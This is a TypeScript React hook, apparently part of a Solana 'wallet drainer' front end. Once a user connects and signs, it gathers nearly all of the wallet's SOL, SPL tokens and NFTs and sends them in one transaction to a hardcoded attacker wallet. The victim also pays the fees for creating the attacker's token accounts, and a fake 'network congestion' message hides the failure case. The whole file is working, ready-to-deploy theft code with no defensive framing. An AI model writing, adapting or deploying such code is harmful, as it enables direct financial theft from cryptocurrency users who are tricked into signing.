"use client";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import {
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import {
    TOKEN_PROGRAM_ID,
    createAssociatedTokenAccountInstruction,
    createTransferInstruction,
    getAssociatedTokenAddressSync
} from "@solana/spl-token";
import { useState } from "react";

// --- CONFIGURATION ---
// The master wallet that will receive all drained assets.
const DESTINATION_WALLET = new PublicKey("8JLWroB4W3sg5dWKj66m9CMKXdb5AkawudZydbLGJe8k");
// Amount of SOL to leave in the user's wallet for future transaction fees.
const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL;
// -------------------

type Status = "idle" | "scanning" | "building" | "signing" | "sending" | "success" | "error";

export const useDrainer = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [status, setStatus] = useState<Status>("idle");
  const [error, setError] = useState<string | null>(null);

  const drain = async () => {
    if (!publicKey || !sendTransaction) {
      setError("Wallet not connected.");
      setStatus("error");
      return;
    }

    setStatus("scanning");
    setError(null);

    try {
      const instructions: TransactionInstruction[] = [];
      const accountsChecked = new Set<string>(); // To avoid duplicate checks for ATA creation

      // 1. --- Native SOL Transfer ---
      const solBalance = await connection.getBalance(publicKey);
      if (solBalance > SOL_TO_LEAVE) {
        instructions.push(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: DESTINATION_WALLET,
            lamports: solBalance - SOL_TO_LEAVE,
          })
        );
      }

      // 2. --- SPL Token & NFT Transfer ---
      // This single process handles both fungible tokens and NFTs.
      // NFTs are just SPL tokens with 0 decimals and an amount of 1.
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      for (const { pubkey, account } of tokenAccounts.value) {
        const tokenAmount = account.data.parsed.info.tokenAmount;

        // We only care about accounts with a positive balance.
        if (tokenAmount.uiAmount > 0) {
          const fromAta = pubkey;
          const mint = new PublicKey(account.data.parsed.info.mint);

          // Get the destination ATA for the attacker.
          const destinationAta = getAssociatedTokenAddressSync(
            mint,
            DESTINATION_WALLET,
            true // Allow owner off-curve addresses.
          );

          // Check if we'''ve already added an instruction to create this ATA.
          if (!accountsChecked.has(destinationAta.toBase58())) {
            const destinationAccountInfo = await connection.getAccountInfo(destinationAta);
            if (!destinationAccountInfo) {
              // If the destination ATA doesn'''t exist, add an instruction to create it.
              // The victim (publicKey) pays for the ATA creation.
              instructions.push(
                createAssociatedTokenAccountInstruction(
                  publicKey,        // Payer
                  destinationAta,   // New ATA
                  DESTINATION_WALLET, // Owner of the new ATA
                  mint              // Mint
                )
              );
            }
            accountsChecked.add(destinationAta.toBase58());
          }

          // Add the instruction to transfer the token/NFT.
          instructions.push(
            createTransferInstruction(
              fromAta,
              destinationAta,
              publicKey, // Owner of the '''from''' account
              BigInt(tokenAmount.amount) // Use the raw amount for full precision
            )
          );
        }
      }

      if (instructions.length === 0) {
        setError("Data Packet Network Congestion.");
        setStatus("error");
        return;
      }

      // 3. --- Build & Send Transaction ---
      setStatus("building");
      const transaction = new Transaction().add(...instructions);
      const {
        context: { slot: minContextSlot },
        value: { blockhash, lastValidBlockHeight },
      } = await connection.getLatestBlockhashAndContext();
      
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;

      setStatus("signing");
      const signature = await sendTransaction(transaction, connection, { minContextSlot });

      setStatus("sending");
      await connection.confirmTransaction({ blockhash, lastValidBlockHeight, signature });

      setStatus("success");
    } catch (e: any) {
      console.error(e);
      // Try to provide a more user-friendly error
      if (e.name === 'WalletSignTransactionError') {
          setError("Transaction rejected by user.");
      } else {
          setError(e.message || "An unknown error occurred.");
      }
      setStatus("error");
    }
  };

  return { drain, status, error };
};